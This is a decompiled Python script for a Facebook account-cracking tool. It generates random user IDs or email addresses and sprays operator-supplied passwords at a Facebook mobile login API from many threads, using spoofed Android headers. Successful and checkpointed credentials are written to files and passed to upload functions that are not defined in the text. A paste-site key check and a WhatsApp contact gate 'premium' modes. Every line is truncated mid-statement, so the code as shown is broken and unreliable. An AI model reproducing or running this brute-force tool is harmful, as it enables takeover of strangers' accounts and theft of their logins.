1 # Decompile by : ABDOU
    2 # Time Succes decompile : 2022-03-07 00:21:4
    3
    4 W = '\033[97;1m'
    5 R = '\033[91;1m'
    6 G = '\033[92;1m'
    7 Y = '\033[93;1m'
    8 B = '\033[94;1m'
    9 P = '\033[95;1m'
   10 C = '\033[96;1m'
   11 N = '\x1b[0m'
   12
   13
   14
   15 import os
   16 try:
   17     import requests
   18 except ImportError:
   19     os.system("pip install requests")
   20
   21 try:
   22     import concurrent.futures
   23 except ImportError:                            24     os.system("pip install futures")
   25
   26 import os
   27 import sys
   28 import time
   29 import requests
   30 import random
   31 import platform
   32 import base64
   33 import subprocess
   34 from concurrent.futures import ThreadPoolExe
   35
   36
   37 def runtxt(z):
   38     for e in z + "\n":
   39         sys.stdout.write(e)
   40         sys.stdout.flush()
   41         time.sleep(0.03)
   42
   43
   44
   45 def helpnote():
   46     print("%s [*] FOLLOW ME ON Fb TU KNOW AB
   47     subprocess.check_output(["am", "start",
   48     exit(" [*] FACEBOOK :  https://www.faceb
   49
   50
   51 def notice():
   52
   53
   54
   55     runtxt("\n\033[0;91m YOU ARE NOT PREMIUM
   56     runtxt("\033[0;93m SEND THIS KEY TO ADMI
   57     runtxt("\033[0;92m ADMIN WHATSAPP >> +88
   58     subprocess.check_output(["am", "start",
   59
   60
   61
   62 plist = (platform.uname())[2]
   63 basex = plist
   64 basex1 = basex.encode('ascii')
   65 basex2 = base64.b64encode(basex1)
   66 basex3 = basex2.decode('ascii')
   67 base4 = (basex3).upper()
   68 basesplit = base4.replace('=', 'X').replace(
   69
   70
   71 class Main:
   72     def __init__(self):
   73         self.id = []
   74         self.ok = []
   75         self.cp = []
   76         self.loop = 0
   77         try:
   78             plr = requests.get('https://past
   79             if basesplit in plr:
   80                 key = basesplit
   81                 stat = ("\033[0;92mPREMIUM")
   82                 FY = '\033[0;93m'
   83                 FG = '\033[0;92m'
   84                 GET = '\r'
   85             else:
   86                 key = ("\033[0;91m -")
   87                 stat = ("\033[0;91mFREE USER
   88                 FY = '\033[0;90m'
   89                 FG = '\033[0;90m'
   90                 GET = '\033[0;92m [P] GET PR
   91         except requests.exceptions.Connectio
   92             print("\n%s [!] NO INTERNET CONN
   93             exit()
   94         os.system("clear")
   95
   96         print ("""\033[1;91m
   97 \033[1;33m /$$$$$$$$ /$$$$$$$        /$$   /
   98 \033[1;32m| $$_____/| $$__  $$      | $$  /$
   99 \033[1;34m| $$      | $$  \ $$      | $$ /$$
  100 \033[1;91m| $$__/   | $$__  $$      | $$  $$
  101 \033[1;93m| $$      | $$  \ $$      | $$\  $
  102 \033[1;97m| $$      | $$$$$$$/      | $$ \
  103 \033[1;31m|__/      |_______/       |__/  \_
  104 \033[1;33m
  105 \033[1;33m
  106
  107 \033[1;90m══════════════════════════════════
  108
  109 \033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92
  110
  111 \033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92
  112
  113 \033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92
  114
  115 \033[1;91m [\033[1;93m✯\033[1;91m] \033[1;91
  116
  117 \033[1;90m══════════════════════════════════
  118     """)
  119         print("%s [%s•%s] %sTOOL NAME : %sIL
  120         print("%s [%s•%s] %sVERSION   : %s2.
  121         print("%s [%s•%s] %sYOUR KEY  : %s%s
  122         print("%s [%s•%s] %sSTATUS    : %s"%
  123         print("")
  124         print("%s [%s1%s]%s CRACK RANDOM FB
  125         print("%s [%s2%s]%s CRACK RANDOM FB
  126         print("%s [%s3%s]%s CRACK RANDOM FB
  127         print("%s [%s4%s]%s CRACK RANDOM FB
  128         print("%s [%s5%s]%s CRACK FROM EMAIL
  129         print("%s [%s6%s]%s CRACK RANDOM FB
  130         print(GET)
  131         hoga = input("\n%s [?] CHOICE : "%(B
  132         if hoga in ["", " "]:
  133             Main()
  134         elif hoga in ["1", "01"]:
  135             self.fbtua()
  136         elif hoga in ["2", "02"]:
  137             if basesplit in plr:
  138                 self.old4_7()
  139             else:
  140                 notice()
  141                 exit()
  142         elif hoga in ["3", "03"]:
  143             if basesplit in plr:
  144                 self.old4_6()
  145             else:
  146                 notice()
  147                 exit()
  148         elif hoga in ["4", "04"]:
  149             if basesplit in plr:
  150                 self.old4_5()
  151             else:
  152                 notice()
  153                 exit()
  154         elif hoga in ["5", "05"]:
  155             if basesplit in plr:
  156                 self.email()
  157             else:
  158                 notice()
  159                 exit()
  160         elif hoga in ["6","06"]:
  161             if basesplit in plr:
  162                 self.oldcrack()
  163             else:
  164                 notice()
  165                 exit()
  166         elif hoga in ["P", "p"]:
  167             notice()
  168             exit()
  169         else:
  170             Main()
  171
  172     def fbtua(self):
  173         x = 111111111
  174         xx = 999999999
  175         idx = "100000"
  176         limit = int(input("\033[0;92m [+] EN
  177         if (limit)>5000:
  178             exit("\n%s [!] DON'T CROSS THE L
  179         try:
  180             for n in range(limit):
  181                 _ = random.randint(x,xx)
  182                 __ = idx
  183                 self.id.append(__+str(_))
  184             print("\033[0;93m [+] TOTAL ID -
  185             with ThreadPoolExecutor(max_work
  186                 print("\n%s [!] USE %s, %s(C
  187                 print("%s EXAMPLE : %s123456
  188                 listpass = input("%s [?] ENT
  189                 if len(listpass)<=5:
  190                     exit("\n%s [!] PASSWORD
  191                 print("%s [*] CRACK WITH PAS
  192                 print("\n%s [+] OK RESULTS S
  193                 print("%s [+] CP RESULTS SAV
  194                 print("%s [!] IF NO RESULT T
  195                 for user in self.id:
  196                     coeg.submit(self.api, us
  197             exit("\n\n%s [#] CRACK COMPLETE.
  198         except Exception as e:exit(str(e))
  199
  200     def old_9(self):
  201         x = 111111
  202         xx = 999999
  203         idx = "100000000"
  204         limit = int(input("\033[0;92m [+] EN
  205         if (limit)>5000:
  206             exit("\n%s [!] DON'T CROSS THE L
  207         try:
  208             for n in range(limit):
  209                 _ = random.randint(x,xx)
  210                 __ = idx
  211                 self.id.append(__+str(_))
  212             print("\033[0;93m [+] TOTAL ID -
  213             with ThreadPoolExecutor(max_work
  214                 print("\n%s [!] USE %s, %s(C
  215                 print("%s EXAMPLE : %s123456
  216                 listpass = input("%s [?] ENT
  217                 if len(listpass)<=5:
  218                     exit("\n%s [!] PASSWORD
  219                 print("%s [*] CRACK WITH PAS
  220                 print("\n%s [+] OK RESULTS S
  221                 print("%s [+] CP RESULTS SAV
  222                 print("%s [!] IF NO RESULT T
  223                 for user in self.id:
  224                     coeg.submit(self.api, us
  225             exit("\n\n%s [#] CRACK COMPLETE.
  226         except Exception as e:exit(str(e))
  227
  228
  229     def old4_7(self):
  230         x = 11111111
  231         xx = 99999999
  232         #idx = input("%s [+] ENTER A DIGIT (
  233         idx = random.choice(["1", "2", "3",
  234         limit = int(input("\033[0;92m [+] EN
  235         if (limit)>10000:
  236             exit("\n%s [!] DON'T CROSS THE L
  237         try:
  238             for n in range(limit):
  239                 _ = random.randint(x,xx)
  240                 __ = idx
  241                 self.id.append(__+str(_))
  242             print("\033[0;93m [+] TOTAL ID -
  243             with ThreadPoolExecutor(max_work
  244                 print("\n%s [!] USE %s, %s(C
  245                 print("%s EXAMPLE : %s123456
  246                 listpass = input("%s [?] ENT
  247                 if len(listpass)<=5:
  248                     exit("\n%s [!] PASSWORD
  249                 print("%s [*] CRACK WITH PAS
  250                 print("\n%s [+] OK RESULTS S
  251                 print("%s [+] CP RESULTS SAV
  252                 print("%s [!] IF NO RESULT T
  253                 for user in self.id:
  254                     coeg.submit(self.api, us
  255             exit("\n\n%s [#] CRACK COMPLETE.
  256         except Exception as e:exit(str(e))
  257
  258
  259     def old4_6(self):
  260         x = 1111111
  261         xx = 9999999
  262         #idx = input("%s [+] ENTER A DIGIT (
  263         idx = random.choice(["1", "2", "3",
  264         limit = int(input("\033[0;92m [+] EN
  265         if (limit)>10000:
  266             exit("\n%s [!] DON'T CROSS THE L
  267         try:
  268             for n in range(limit):
  269                 _ = random.randint(x,xx)
  270                 __ = idx
  271                 self.id.append(__+str(_))
  272             print("\033[0;93m [+] TOTAL ID -
  273             with ThreadPoolExecutor(max_work
  274                 print("\n%s [!] USE %s, %s(C
  275                 print("%s EXAMPLE : %s123456
  276                 listpass = input("%s [?] ENT
  277                 if len(listpass)<=5:
  278                     exit("\n%s [!] PASSWORD
  279                 print("%s [*] CRACK WITH PAS
  280                 print("\n%s [+] OK RESULTS S
  281                 print("%s [+] CP RESULTS SAV
  282                 print("%s [!] IF NO RESULT T
  283                 for user in self.id:
  284                     coeg.submit(self.api, us
  285             exit("\n\n%s [#] CRACK COMPLETE.
  286         except Exception as e:exit(str(e))
  287
  288
  289     def old4_5(self):
  290         x = 111111
  291         xx = 999999
  292         #idx = input("%s [+] ENTER A DIGIT (
  293         idx = random.choice(["1", "2", "3",
  294         limit = int(input("\033[0;92m [+] EN
  295         if (limit)>10000:
  296             exit("\n%s [!] DON'T CROSS THE L
  297         try:
  298             for n in range(limit):
  299                 _ = random.randint(x,xx)
  300                 __ = idx
  301                 self.id.append(__+str(_))
  302             print("\033[0;93m [+] TOTAL ID -
  303             with ThreadPoolExecutor(max_work
  304                 print("\n%s [!] USE %s, %s(C
  305                 print("%s EXAMPLE : %s123456
  306                 listpass = input("%s [?] ENT
  307                 if len(listpass)<=5:
  308                     exit("\n%s [!] PASSWORD
  309                 print("%s [*] CRACK WITH PAS
  310                 print("\n%s [+] OK RESULTS S
  311                 print("%s [+] CP RESULTS SAV
  312                 print("%s [!] IF NO RESULT T
  313                 for user in self.id:
  314                     coeg.submit(self.api, us
  315             exit("\n\n%s [#] CRACK COMPLETE.
  316         except Exception as e:exit(str(e))
  317
  318
  319     def email(self):
  320         x = 111
  321         xx = 999
  322         nam = input("%s [?] TYPE A NAME %s(E
  323         nam = nam.replace(" ", "")
  324         print("%s EXAMPLE  : %s@gmail.com, @
  325         idx = input("%s DOMAIN  : "%(B))
  326         limit = int(input("\033[0;92m [+] EN
  327         if (limit)>5000:
  328             exit("\n%s [!] DON'T CROSS THE L
  329         try:
  330             for n in range(limit):
  331                 _ = random.randint(x,xx)
  332                 __ = idx
  333                 ___ = nam
  334                 self.id.append(___+str(_)+__
  335             print("\033[0;93m [+] TOTAL ID -
  336             with ThreadPoolExecutor(max_work
  337                 print("\n%s [!] USE %s, %s(C
  338                 print("%s EXAMPLE : %s123456
  339                 listpass = input(" [?] ENTER
  340                 if len(listpass)<=5:
  341                     exit("\n%s [!] PASSWORD
  342                 print("%s [*] CRACK WITH PAS
  343                 print("\n%s [+] OK RESULTS S
  344                 print("%s [+] CP RESULT SAVE
  345                 print("%s [!] IF NO RESULT T
  346                 for user in self.id:
  347                     coeg.submit(self.api, us
  348             exit("\n\n%s [#] CRACK COMPLETE.
  349         except Exception as e:exit(str(e))
  350
  351     def oldcrack(self):
  352         x = 11111111
  353         xx = 99999999
  354         idx = input("%s [+] ENTER A DIGIT (1
  355         idx = random.choice(["1", "2", "3",
  356         limit = int(input("\033[0;92m [+] EN
  357         if (limit)>10000:
  358             exit("\n%s [!] DON'T CROSS THE L
  359         try:
  360             for n in range(limit):
  361                 _ = random.randint(x,xx)
  362                 __ = idx
  363                 self.id.append(__+str(_))
  364             print("\033[0;93m [+] TOTAL ID -
  365             with ThreadPoolExecutor(max_work
  366                 print("\n%s [!] USE %s, %s(C
  367                 print("%s EXAMPLE : %s123456
  368                 listpass = input("%s [?] ENT
  369                 if len(listpass)<=5:
  370                     exit("\n%s [!] PASSWORD
  371                 print("%s [*] CRACK WITH PAS
  372                 print("\n%s [+] OK RESULTS S
  373                 print("%s [+] CP RESULTS SAV
  374                 print("%s [!] IF NO RESULT T
  375                 for user in self.id:
  376                     coeg.submit(self.api, us
  377             exit("\n\n%s [#] CRACK COMPLETE.
  378         except Exception as e:exit(str(e))
  379
  380
  381     def api(self, uid, pwx):
  382         ua = random.choice([
  383             "Dalvik/1.6.0 (Linux; U; Android
  384             "Mozilla/5.0 (Linux; Android 10;
  385         ])
  386         sys.stdout.write(
  387             "\r\r %s[>_] [AB_DOU] : %s/%s -
  388         ); sys.stdout.flush()
  389         for pw in pwx:
  390             pw = pw.lower()
  391             ses = requests.Session()
  392             headers = {
  393                 "x-fb-connection-bandwidth":
  394                 "x-fb-sim-hni": str(random.r
  395                 "x-fb-net-hni": str(random.r
  396                 "x-fb-connection-quality": "
  397                 "x-fb-connection-type": "cel
  398                 "user-agent": ua,
  399                 "content-type": "application
  400                 "x-fb-http-engine": "Liger"
  401             }
  402             response = ses.get("https://b-ap
  403             if "session_key" in response.tex
  404                 print("\r \033[0;92m[AB_DOU
  405                 self.ok.append("%s|%s"%(uid,
  406                 open("ok.txt","a").write(" [
  407                 uploadoks()
  408                 break
  409             elif "www.facebook.com" in respo
  410                 print("\r \033[0;93m[AB_DOU
  411                 self.cp.append("%s|%s"%(uid,
  412                 open("cp.txt","a").write(" [
  413                 uploadcps()
  414                 break
  415             else:
  416                 continue
  417
  418         self.loop +=1
  419
  420 if len(sys.argv) == 2:
  421     if sys.argv[1] == "--help" or sys.argv[1
  422         helpnote()
  423     else:
  424         Main()
  425
  426 try:Main()
  427 except Exception as e:exit(str(e))
  428
  429
